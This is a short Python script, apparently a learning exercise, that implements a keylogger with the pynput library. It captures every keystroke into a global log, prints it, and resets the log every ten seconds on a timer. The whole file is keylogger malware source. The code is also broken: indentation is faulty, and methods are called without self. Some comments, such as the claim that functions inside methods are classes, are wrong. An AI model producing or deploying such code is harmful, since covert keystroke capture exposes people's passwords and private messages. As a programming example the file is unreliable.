#!/usr/bin/env python3

#need pynput - not preinstalled
#pip install pynput / pip3 install pynput

import pynput.keyboard
import threading

log = "" #init var for storing keystrokes

class Keylogger: #class names start with capital letter conventionally
    def process_keypress(self, key): #functions inside methods are classes
    global log #to define global variables
    try:
        log = log + str(key.char) #key is of type KeyType and cannot be concat'ed
    except AttributeError: #AttributeError triggered if special char is used (Space, etc)
        if key == key.space:
            log = log + " " #print space rather than Key.space
         else:
            log = log + " " + str(key) + " " #add space in between
    #print(key)
    #print(key.char)
    print(log)

    def report(self):
        global log
        print(log)
        log = ""
        timer = threading.Timer(10, report) #recursive function - report calls itself
        timer.start()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = process_keypress)
        #create listener object from pynput and store as var
        #pass to process_keypress function defined above

        with keyboard_listener:
            report()
            keyboard_listener.join()

        #since there is no place to implement a reporting function,
        #need to do something like threading to have code running in the background without
        #interrupting the program's main functions
